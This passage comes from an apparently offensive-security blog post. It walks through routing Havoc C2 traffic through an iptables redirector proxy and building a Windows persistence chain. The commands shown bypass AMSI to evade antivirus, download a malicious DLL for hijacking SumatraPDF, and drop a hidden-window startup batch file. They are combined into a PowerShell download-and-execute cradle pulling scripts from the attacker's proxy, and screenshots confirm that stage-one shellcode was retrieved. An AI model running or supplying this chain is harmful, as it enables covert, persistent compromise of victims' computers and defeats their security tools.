-j ACCEPT</p><p id="53ad" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -A FORWARD -i eth0 -o eth0 -p tcp — syn — dport 443 -m conntrack — ctstate NEW -j ACCEPT</p><p id="991b" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -A FORWARD -i eth0 -o eth0 -m conntrack — ctstate ESTABLISHED,RELATED -j ACCEPT</p></blockquote><p id="1035" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">For grabbing iloveblogs.bin (stage 1) shellcode from C&amp;C server on port 50000</strong></p><blockquote class="qg qh qi"><p id="88af" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 80 -j DNAT — to-destination 2.2.2.2:50000<br>sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50000 -d 2.2.2.2 -j MASQUERADE</p></blockquote><p id="34fa" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">For grabbing demon.x64.bin (stage 2) shellcode from C&amp;C server on port 50001</strong></p><blockquote class="qg qh qi"><p id="8f5a" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 8443 -j DNAT — to-destination 2.2.2.2:50001<br>sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50001 -d 2.2.2.2 -j MASQUERADE</p></blockquote><p id="425b" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">For establishing Havoc C2 connection to C&amp;C server on port 50002</strong></p><blockquote class="qg qh qi"><p id="e88e" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">iptables -t nat -A PREROUTING -i eth0 -p tcp — dport 443 -j DNAT — to-destination 2.2.2.2:50002<br>sudo iptables -t nat -A POSTROUTING -o eth0 -p tcp — dport 50002 -d 2.2.2.2 -j MASQUERADE</p></blockquote><p id="5a42" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Specify that, by default, any packet that doesn’t match any specific rule above in the FORWARD chain should be dropped (ignored) rather than being forwarded</strong></p><blockquote class="qg qh qi"><p id="51f4" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">sudo iptables -P FORWARD DROP</p></blockquote><p id="4b29" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Just as a proof of concept, you can forward ports 50000, 50001, and 50002 (which is being sent from the proxy server) on your home router configuration to ports 50000, 50001, and 50002 on your kali virtual machine (192.168.0.64 in my case) which is what I did.</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IdY_Jo_9pQrbALIjoL3xmA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*IdY_Jo_9pQrbALIjoL3xmA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*IdY_Jo_9pQrbALIjoL3xmA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*IdY_Jo_9pQrbALIjoL3xmA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*IdY_Jo_9pQrbALIjoL3xmA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*IdY_Jo_9pQrbALIjoL3xmA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*IdY_Jo_9pQrbALIjoL3xmA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*IdY_Jo_9pQrbALIjoL3xmA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn re c" width="700" height="532" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*IdY_Jo_9pQrbALIjoL3xmA.png"></picture></div></div></figure><p id="879f" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">At this point, set up all the listening posts on the C&amp;C Server and you’re good to go with a simple proxy server forwarding and receiving all your requests.</p><h3 id="682d" class="ok ol hl bg om on oo ef op oq or eh os np ot ou ov nt ow ox oy nx oz pa pb pc bl" data-selectable-paragraph="">Exploitation Chain Example</h3><p id="9a70" class="pw-post-body-paragraph ng nh hl ni b ij pd nk nl im pe nn no np pf nr ns nt pg nv nw nx ph nz oa ob he bl" data-selectable-paragraph="">So now that we have our infrastructure for hiding ourselves set up, let's go over an exploitation chain we could use to realistically maintain persistence on a windows machine with our DLL hijacking executable.</p><ol class=""><li id="79d0" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob rr od oe bl" data-selectable-paragraph="">Gain Administrator access on victim via credentials or physical access</li><li id="a2cd" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob rr od oe bl" data-selectable-paragraph="">Execute amsi.dll memory patch bypass in PowerShell</li><li id="91de" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob rr od oe bl" data-selectable-paragraph="">Grab DLL and executable (SumatraPDF-3.5.2-install.exe) and put in “C:\Program Files\” folder</li><li id="fed6" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob rr od oe bl" data-selectable-paragraph="">Create BAT file that will load our executable (and DLL) from “C:\Program Files” in a hidden window</li><li id="496c" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob rr od oe bl" data-selectable-paragraph="">Put BAT file in startup directory to run every time the user logs in</li></ol><p id="6e27" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We’re going to assume step 1 completed through some prior exploitation or we have physical access to the victim's computer.</p><p id="76f3" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">amsi.dll memory patch bypass in PowerShell</strong></p><p id="47a4" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">First, we either open an administrator PowerShell session on GUI, upgrade to PowerShell with a reverse shell one-liner to our attacker machine, or use runascs with supplied administrator credentials. We then execute an AMSI memory patching script so we can run anything in the current PowerShell process memory, and it won't be flagged by AV. I just did this as a precaution. Check out my AMSI Bypass post if you don’t know how to do this.</p><p id="3a0c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Grab DLL and executable (SumatraPDF-3.5.2-install.exe) and put in “C:\Program Files\” folder</strong></p><p id="d50c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We need to create the SumatraPDF directory. Then we grab our normal executable from the actual vendor website and malicious DLL from our proxy and put them in the “C:\Program Files\SumatraPDF\” directory.</p><blockquote class="qg qh qi"><p id="b12c" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">New-Item -ItemType Directory -Path ‘C:\Program Files\SumatraPDF’</p><p id="d832" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">(New-Object System.Net.WebClient).DownloadFile(‘http://[proxy public IP]/DWrite.dll’, ‘C:\Program Files\SumatraPDF\DWrite.dll’) <br>(New-Object System.Net.WebClient).DownloadFile(‘<a class="ah rg" href="https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe'" rel="noopener ugc nofollow" target="_blank">https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe'</a>, ‘C:\Program Files\SumatraPDF\SumatraPDF-3.5.2–64-install.exe’)</p></blockquote><p id="4d8d" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Create BAT file that will load our executable (and DLL) from “C:\Program Files\” in a hidden window</strong></p><p id="487d" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Then we create a batch script called SumatraPDFInstall.bat that will be run every time the user logs in, but with a hidden window.</p><blockquote class="qg qh qi"><p id="783e" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><a class="ah rg" href="http://twitter.com/echo" rel="noopener ugc nofollow" target="_blank">@echo</a> off<br>set “executablePath=C:\Program Files\SumatraPDF\SumatraPDF-3.5.2–64-install.exe”</p><p id="8d86" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">start /min “” “%executablePath%”</p></blockquote><p id="1930" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Put BAT file in startup directory to run every time the user logs in</strong></p><p id="2dc0" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Now we can grab our BAT file remotely and put it in the startup folder to be executed every time the user logs on.</p><blockquote class="qg qh qi"><p id="5b67" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Invoke-WebRequest -Uri “http://[proxy public IP]/SumatraPDFInstall.bat” -OutFile “$env:TEMP\SumatraPDFInstall.bat”<br>Copy-Item -Path “$env:TEMP\SumatraPDFInstall.bat” -Destination “$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\” -Force<br>Remove-Item “$env:TEMP\SumatraPDFInstall.bat”</p></blockquote><p id="c705" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Let's put all of this in a single PowerShell Script called notstrange.ps1 and I can use the public IP address of my proxy server and use port 80 which is already being port-forwarded.</p><blockquote class="qg qh qi"><p id="4d4f" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://[proxy public IP]/ammy.ps1’)”<br>New-Item -ItemType Directory -Path ‘C:\Program Files\SumatraPDF’<br>(New-Object System.Net.WebClient).DownloadFile(‘http://[proxy public IP]/DWrite.dll’, ‘C:\Program Files\SumatraPDF\DWrite.dll’) <br>(New-Object System.Net.WebClient).DownloadFile(‘https://www.sumatrapdfreader.org/dl/rel/3.5.2/SumatraPDF-3.5.2-64-install.exe', ‘C:\Program Files\SumatraPDF\SumatraPDF-3.5.2–64-install.exe’) <br>Invoke-WebRequest -Uri “http://[proxy public IP]/SumatraPDFInstall.bat” -OutFile “$env:TEMP\SumatraPDFInstall.bat”<br>Copy-Item -Path “$env:TEMP\SumatraPDFInstall.bat” -Destination “$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\” -Force<br>Remove-Item “$env:TEMP\SumatraPDFInstall.bat”</p></blockquote><p id="d920" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Make sure your Havoc C2 infrastructure is running and everything is forwarded where it should be. In the victim PowerShell terminal run the following command and you will be all set:</p><blockquote class="qg qh qi"><p id="3a58" class="ng nh qj ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><em class="hl">iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://[Proxy public IP]/notstrange.ps1')”</em></p></blockquote><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rs"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VBHTXif3Tikyz3uhEL93qw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*VBHTXif3Tikyz3uhEL93qw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*VBHTXif3Tikyz3uhEL93qw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*VBHTXif3Tikyz3uhEL93qw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*VBHTXif3Tikyz3uhEL93qw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*VBHTXif3Tikyz3uhEL93qw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*VBHTXif3Tikyz3uhEL93qw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*VBHTXif3Tikyz3uhEL93qw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn re c" width="700" height="140" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*VBHTXif3Tikyz3uhEL93qw.png"></picture></div></div></figure><p id="7c61" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We see that the amsi.dll bypass was successful (returned true) and the directory “C:\Program Files” is created. Our files are also grabbed through the proxy server on our C&amp;C server.</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div class="qq qr rt"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 1100w, https://miro.medium.com/v2/resize:fit:1236/format:webp/1*x1xEl5pV-osbFsJIEkh4TA.png 1236w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 618px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*x1xEl5pV-osbFsJIEkh4TA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*x1xEl5pV-osbFsJIEkh4TA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*x1xEl5pV-osbFsJIEkh4TA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*x1xEl5pV-osbFsJIEkh4TA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*x1xEl5pV-osbFsJIEkh4TA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*x1xEl5pV-osbFsJIEkh4TA.png 1100w, https://miro.medium.com/v2/resize:fit:1236/1*x1xEl5pV-osbFsJIEkh4TA.png 1236w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 618px"><img alt="" class="bi mn re c" width="618" height="116" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:618/1*x1xEl5pV-osbFsJIEkh4TA.png"></picture></div></figure><p id="35e6" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">And then when a user logs in…</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr ru"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D95VIiH6cOujga7OQJJm-w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*D95VIiH6cOujga7OQJJm-w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*D95VIiH6cOujga7OQJJm-w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*D95VIiH6cOujga7OQJJm-w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*D95VIiH6cOujga7OQJJm-w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*D95VIiH6cOujga7OQJJm-w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*D95VIiH6cOujga7OQJJm-w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*D95VIiH6cOujga7OQJJm-w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn re c" width="700" height="415" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*D95VIiH6cOujga7OQJJm-w.png"></picture></div></div></figure><p id="573c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We see the executable running like normal on the bottom menu out of the users way.</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rv"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bGFV55NZd6m-p8rn6t_t8w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*bGFV55NZd6m-p8rn6t_t8w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*bGFV55NZd6m-p8rn6t_t8w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*bGFV55NZd6m-p8rn6t_t8w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*bGFV55NZd6m-p8rn6t_t8w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*bGFV55NZd6m-p8rn6t_t8w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*bGFV55NZd6m-p8rn6t_t8w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*bGFV55NZd6m-p8rn6t_t8w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn re c" width="700" height="199" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*bGFV55NZd6m-p8rn6t_t8w.png"></picture></div></div></figure><p id="924d" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Our iloveblogs.bin stage 1 payload is downloaded from our http server through the proxy server.</p><figure class="qt qu qv qw qx qk qq qr paragraph-image"><div class="qq qr rw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 1100w, https://miro.medium.com/v2/resize:fit:1162/format:webp/1*v3jQ80nj4SypfWrQ8-1bOQ.png 1162w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 581px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*v3jQ80nj4SypfWrQ8-1bOQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*v3jQ80nj4SypfWrQ8-1bOQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*v3jQ80nj4SypfWrQ8-1bOQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*v3jQ80nj4SypfWrQ8-1bOQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*v3jQ80nj4SypfWrQ8-1bOQ.png 828w, 